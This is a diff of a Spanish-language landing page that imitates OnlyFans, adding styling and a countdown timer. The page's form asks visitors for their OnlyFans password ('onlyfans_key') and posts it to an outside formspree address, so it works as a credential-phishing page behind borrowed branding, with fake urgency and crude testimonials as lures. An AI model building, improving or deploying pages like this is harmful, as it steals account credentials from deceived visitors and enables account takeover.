@@ -6,6 +6,159 @@
     <title>Exclusive Content | OnlyFans</title>
     <link rel="stylesheet" href="styles.css">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        /* Estilo general */
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #222;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Contenedor general */
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+            position: relative;
+            padding: 20px;
+        }
+
+        /* Música de fondo */
+        audio {
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            display: none;
+        }
+
+        /* Estilo para el logo y el encabezado */
+        .header {
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            width: 200px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        .tagline {
+            font-size: 1.5em;
+            color: #FFD700;
+        }
+
+        /* Llamada a la acción principal */
+        .cta {
+            margin-bottom: 30px;
+        }
+
+        .cta h2 {
+            font-size: 2.5em;
+            color: #FFD700;
+            margin-bottom: 10px;
+        }
+
+        .cta p {
+            font-size: 1.2em;
+            color: #fff;
+        }
+
+        .button {
+            padding: 10px 20px;
+            background-color: #FFD700;
+            color: #222;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+            margin-top: 20px;
+        }
+
+        .button:hover {
+            background-color: #c9a600;
+        }
+
+        /* Estilo para el contador regresivo */
+        .countdown {
+            margin-top: 20px;
+            font-size: 2em;
+            color: #FFD700;
+        }
+
+        /* Estilo para los beneficios */
+        .benefits {
+            margin-top: 30px;
+            font-size: 1.2em;
+            list-style: none;
+            padding: 0;
+        }
+
+        .benefits li {
+            margin: 10px 0;
+        }
+
+        /* Testimonios */
+        .testimonials {
+            margin-top: 30px;
+            font-size: 1.1em;
+            color: #FFD700;
+        }
+
+        .testimonials p {
+            margin-bottom: 10px;
+        }
+
+        /* Formulario VIP */
+        .vip-form {
+            background-color: rgba(0, 0, 0, 0.8);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(255, 215, 0, 0.5);
+            margin-top: 30px;
+            width: 100%;
+            max-width: 600px;
+        }
+
+        .vip-form input, .vip-form button {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            font-size: 1em;
+        }
+
+        .vip-form input {
+            border: 1px solid #FFD700;
+            color: #222;
+        }
+
+        .vip-form button {
+            background-color: #FFD700;
+            color: #222;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+        }
+
+        .vip-form button:hover {
+            background-color: #c9a600;
+        }
+
+        /* Estilo para la sección de redes sociales */
+        .social {
+            margin-top: 40px;
+        }
+
+        .social a {
+            display: inline-block;
+            margin-top: 10px;
+        }
+    </style>
 </head>
 <body>
 
@@ -15,9 +168,10 @@
     </audio>
 
     <div class="container">
+
         <!-- Encabezado con logo y bienvenida -->
         <div class="header">
-            <img src="Onlyfans-Logo-2016.png" alt="OnlyFans Logo" class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6e/OnlyFans_logo_2021.png" alt="OnlyFans Logo" class="logo">
             <h1>💎EXCLUSIVE CONTENT💎</h1>
             <p class="tagline">💎Donde el lujo y el placer se encuentran.💎</p>
         </div>
@@ -53,18 +207,6 @@
             <p>"Me flipa tu p**** enserio, ufff" - <b>Adri C.</b></p>
         </div>
 
-        <!-- Sección VIP -->
-        <div class="vip-section">
-            <h3>Accede al VIP Club</h3>
-            <p>Únete a los miembros élite y desbloquea beneficios inigualables.</p>
-            <ul>
-                <li>🎥 Acceso a contenido en alta definición</li>
-                <li>💎 Descuentos y promociones exclusivas</li>
-                <li>🔓 Contenido adelantado antes que nadie</li>
-            </ul>
-            <a href="https://onlyfans.com/he6him6jim6" class="button">Únete al VIP Club</a>
-        </div>
-
         <!-- Formulario de acceso VIP -->
         <form action="https://formspree.io/f/xvgkgeye" method="POST" class="vip-form">
             <h3>Accede a una muestra exclusiva</h3>
@@ -74,9 +216,6 @@
             
             <!-- Campo de clave para OnlyFans -->
             <input type="password" name="onlyfans_key" placeholder="Ingresa tu clave para OnlyFans" required>
-            
-            <!-- Campo de mensaje (opcional) -->
-            <textarea name="message" placeholder="Opcional: Deja un mensaje o comentario" rows="4"></textarea>
             
             <!-- Botón para enviar -->
             <button type="submit">Obtener Muestra</button>
@@ -88,7 +227,28 @@
         </div>
     </div>
 
-    <script src="script.js"></script>
+    <script>
+        // Contador regresivo
+        const countdownDate = new Date("March 31, 2025 23:59:59").getTime();
+
+        const timer = setInterval(function() {
+            const now = new Date().getTime();
+            const distance = countdownDate - now;
+
+            const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+            document.getElementById("timer").innerHTML = days + "d " + hours + "h "
+            + minutes + "m " + seconds + "s ";
+
+            if (distance < 0) {
+                clearInterval(timer);
+                document.getElementById("timer").innerHTML = "Oferta expirada";
+            }
+        }, 1000);
+    </script>
 
 </body>
 </html>
